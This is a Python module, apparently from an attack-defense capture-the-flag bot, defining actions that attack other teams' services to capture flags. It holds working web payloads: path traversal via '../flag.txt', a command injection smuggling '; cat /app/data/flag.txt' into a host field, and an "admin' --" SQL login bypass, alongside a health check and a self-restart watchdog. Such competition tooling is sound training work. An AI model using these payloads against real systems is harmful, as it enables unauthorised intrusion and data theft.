from __future__ import annotations

import hashlib
import secrets
import urllib.parse
import urllib.request
from dataclasses import dataclass
from http.cookiejar import CookieJar
from typing import Protocol

from .runtime import (
    BotContext,
    _service_control_host,
    call_service_control,
    info,
    ok,
    warn,
)


@dataclass
class ActionResult:
    action_id: str
    target_team: int | None
    status: str
    flags: list[str]
    message: str = ""


class BotAction(Protocol):
    id: str
    label: str
    category: str
    scope: str
    description: str
    required_capabilities: frozenset

    def run(self, ctx: BotContext, target_team: int | None = None) -> ActionResult:
        ...


class HealthCheckAction:
    id = "recon.health"
    label = "Health check"
    category = "Recon"
    scope = "target"
    required_capabilities: frozenset = frozenset()
    description = "GET /health before heavier actions."

    def run(self, ctx: BotContext, target_team: int | None = None) -> ActionResult:
        assert target_team is not None
        body = ctx.get(f"{ctx.service_url(target_team)}/health")
        healthy = body is not None and "ok" in body.lower()
        return ActionResult(
            self.id,
            target_team,
            "ok" if healthy else "miss",
            [],
            "/health ok" if healthy else "/health failed",
        )


class PathTraversalAction:
    id = "exploit.path_traversal"
    label = "Path traversal"
    category = "Exploit"
    scope = "target"
    required_capabilities: frozenset = frozenset()
    description = "Read ../flag.txt through /export."

    def run(self, ctx: BotContext, target_team: int | None = None) -> ActionResult:
        assert target_team is not None
        query = urllib.parse.urlencode({"file": "../flag.txt"})
        body = ctx.get(f"{ctx.service_url(target_team)}/export?{query}")
        flags = ctx.flag_re().findall(body or "")
        return ActionResult(self.id, target_team, "ok" if flags else "miss", flags)


class CommandInjectionAction:
    id = "exploit.cmdi"
    label = "Command injection"
    category = "Exploit"
    scope = "target"
    required_capabilities: frozenset = frozenset()
    description = "Inject a flag read through /admin/diagnostics."

    def run(self, ctx: BotContext, target_team: int | None = None) -> ActionResult:
        assert target_team is not None
        body = ctx.post(
            f"{ctx.service_url(target_team)}/admin/diagnostics",
            {"host": "127.0.0.1; cat /app/data/flag.txt"},
        )
        flags = ctx.flag_re().findall(body or "")
        return ActionResult(self.id, target_team, "ok" if flags else "miss", flags)


class SqlInjectionAction:
    id = "exploit.sqli"
    label = "SQL injection"
    category = "Exploit"
    scope = "target"
    required_capabilities: frozenset = frozenset()
    description = "Bypass login as admin and read /notes."

    def run(self, ctx: BotContext, target_team: int | None = None) -> ActionResult:
        assert target_team is not None
        base = ctx.service_url(target_team)
        cookie_jar = CookieJar()
        opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie_jar))

        login = ctx.post(f"{base}/login", {"username": "admin' --", "password": "x"}, opener)
        if login is None:
            return ActionResult(self.id, target_team, "miss", [], "login unreachable")

        notes = ctx.get(f"{base}/notes", opener)
        flags = ctx.flag_re().findall(notes or "")
        return ActionResult(self.id, target_team, "ok" if flags else "miss", flags)


class PlantProbeAction:
    id = "probe.plant_endpoint"
    label = "Plant endpoint probe"
    category = "Probe"
    scope = "target"
    required_capabilities: frozenset = frozenset()
    description = "Probe /internal/plant with an intentionally invalid token."

    def run(self, ctx: BotContext, target_team: int | None = None) -> ActionResult:
        assert target_team is not None
        fake_flag = f"FLAG{{{secrets.token_hex(16)}}}"
        code, body = ctx.post_json(
            f"{ctx.service_url(target_team)}/internal/plant",
            {"flag": fake_flag},
            {"X-Plant-Token": "wrongtoken"},
        )
        if code == 403:
            return ActionResult(self.id, target_team, "ok", [], "endpoint alive, token rejected")
        if code == 200:
            return ActionResult(self.id, target_team, "ok", [fake_flag], "token accepted")
        if code == 0:
            return ActionResult(self.id, target_team, "miss", [], "unreachable")
        return ActionResult(self.id, target_team, "miss", [], f"HTTP {code}: {body.strip()[:80]}")


class WatchdogAction:
    id = "maintain.watchdog"
    label = "Service watchdog"
    category = "Maintenance"
    scope = "self"
    required_capabilities: frozenset = frozenset({"service.control.local"})
    description = "Restart the team app via the service-control API if it is unhealthy."

    def run(self, ctx: BotContext, target_team: int | None = None) -> ActionResult:
        if ctx.my_team is None:
            return ActionResult(self.id, None, "skipped", [], "own team unknown")

        missing = self.required_capabilities - ctx.capabilities
        if missing:
            return ActionResult(
                self.id, ctx.my_team, "skipped", [],
                f"missing capabilities: {', '.join(sorted(missing))}",
            )

        host = _service_control_host(ctx.my_team)
        try:
            data = call_service_control(host, "GET", "/service/health")
        except Exception as exc:
            return ActionResult(self.id, ctx.my_team, "error", [],
                                f"service-control unreachable: {exc}")

        if data.get("running", False):
            return ActionResult(self.id, ctx.my_team, "ok", [], "service app is running")

        try:
            call_service_control(host, "POST", "/service/restart")
            return ActionResult(self.id, ctx.my_team, "ok", [], "service app restarted")
        except Exception as exc:
            return ActionResult(self.id, ctx.my_team, "error", [], f"restart failed: {exc}")


def _build_registry() -> dict[str, BotAction]:
    actions: list[BotAction] = [
        HealthCheckAction(),
        PathTraversalAction(),
        CommandInjectionAction(),
        SqlInjectionAction(),
        PlantProbeAction(),
        WatchdogAction(),
    ]
    return {action.id: action for action in actions}


ACTION_REGISTRY = _build_registry()


def action_catalog() -> list[dict[str, object]]:
    return [
        {
            "id": action.id,
            "label": action.label,
            "category": action.category,
            "scope": action.scope,
            "description": action.description,
            "required_capabilities": sorted(getattr(action, "required_capabilities", [])),
        }
        for action in ACTION_REGISTRY.values()
    ]


def log_action_result(result: ActionResult) -> None:
    prefix = result.action_id
    team = f"team{result.target_team}" if result.target_team is not None else "self"
    if result.flags:
        for flag in result.flags:
            fingerprint = hashlib.sha256(flag.encode("utf-8")).hexdigest()[:12]
            ok(f"{team} [{prefix}] flag captured ({fingerprint})")
        return

    message = result.message or "no flag found"
    if result.status == "ok":
        info(f"{team} [{prefix}] {message}")
    elif result.status == "skipped":
        warn(f"{team} [{prefix}] skipped: {message}")
    else:
        warn(f"{team} [{prefix}] {message}")
